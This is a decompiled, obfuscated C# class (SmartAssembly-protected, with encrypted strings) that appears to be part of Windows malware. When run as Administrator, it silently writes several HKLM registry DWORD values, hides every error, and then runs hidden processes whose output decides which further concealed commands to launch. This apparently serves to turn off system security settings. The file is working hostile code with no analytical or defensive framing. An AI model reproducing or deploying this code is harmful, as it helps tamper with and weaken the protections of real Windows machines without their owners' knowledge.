using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

public static class hQckcNGWHqE
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void LfqZChyBnexU()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			AyMbRToXLiaHQLG(getString_0(107406119), getString_0(107406026), getString_0(107389327));
			AyMbRToXLiaHQLG(getString_0(107406001), getString_0(107406452), getString_0(107406663));
			AyMbRToXLiaHQLG(getString_0(107406459), getString_0(107406370), getString_0(107406663));
			AyMbRToXLiaHQLG(getString_0(107406459), getString_0(107406333), getString_0(107406663));
			AyMbRToXLiaHQLG(getString_0(107406459), getString_0(107406264), getString_0(107406663));
			joxHaRswRsTQzUF();
		}
	}

	private static void AyMbRToXLiaHQLG(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void joxHaRswRsTQzUF()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392595),
			Arguments = getString_0(107406227),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107405678)) && text.EndsWith(getString_0(107405673)))
			{
				FMJphvrJeZVJA(getString_0(107405664));
			}
			else if (text.StartsWith(getString_0(107406370)) && text.EndsWith(getString_0(107405673)))
			{
				FMJphvrJeZVJA(getString_0(107405595));
			}
			else if (text.StartsWith(getString_0(107405494)) && text.EndsWith(getString_0(107405673)))
			{
				FMJphvrJeZVJA(getString_0(107405461));
			}
			else if (text.StartsWith(getString_0(107405908)) && text.EndsWith(getString_0(107405673)))
			{
				FMJphvrJeZVJA(getString_0(107405879));
			}
			else if (text.StartsWith(getString_0(107405850)) && text.EndsWith(getString_0(107405673)))
			{
				FMJphvrJeZVJA(getString_0(107405825));
			}
			else if (text.StartsWith(getString_0(107405768)) && text.EndsWith(getString_0(107405673)))
			{
				FMJphvrJeZVJA(getString_0(107405163));
			}
			else if (text.StartsWith(getString_0(107405070)) && text.EndsWith(getString_0(107405673)))
			{
				FMJphvrJeZVJA(getString_0(107405037));
			}
			else if (text.StartsWith(getString_0(107404972)) && text.EndsWith(getString_0(107405673)))
			{
				FMJphvrJeZVJA(getString_0(107404959));
			}
			else if (text.StartsWith(getString_0(107405362)) && text.EndsWith(getString_0(107405673)))
			{
				FMJphvrJeZVJA(getString_0(107405333));
			}
			else if (text.StartsWith(getString_0(107405272)) && !text.EndsWith(getString_0(107405275)))
			{
				FMJphvrJeZVJA(getString_0(107405238));
			}
			else if (text.StartsWith(getString_0(107405213)) && !text.EndsWith(getString_0(107389327)))
			{
				FMJphvrJeZVJA(getString_0(107404680));
			}
			else if (text.StartsWith(getString_0(107404635)) && !text.EndsWith(getString_0(107404602)))
			{
				FMJphvrJeZVJA(getString_0(107404565));
			}
			else if (text.StartsWith(getString_0(107404496)) && !text.EndsWith(getString_0(107404602)))
			{
				FMJphvrJeZVJA(getString_0(107404459));
			}
			else if (text.StartsWith(getString_0(107404906)) && !text.EndsWith(getString_0(107404602)))
			{
				FMJphvrJeZVJA(getString_0(107404905));
			}
			else if (text.StartsWith(getString_0(107404816)) && !text.EndsWith(getString_0(107404602)))
			{
				FMJphvrJeZVJA(getString_0(107404779));
			}
		}
	}

	public static void FMJphvrJeZVJA(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392595),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static hQckcNGWHqE()
	{
		Strings.CreateGetStringDelegate(typeof(hQckcNGWHqE));
	}
}
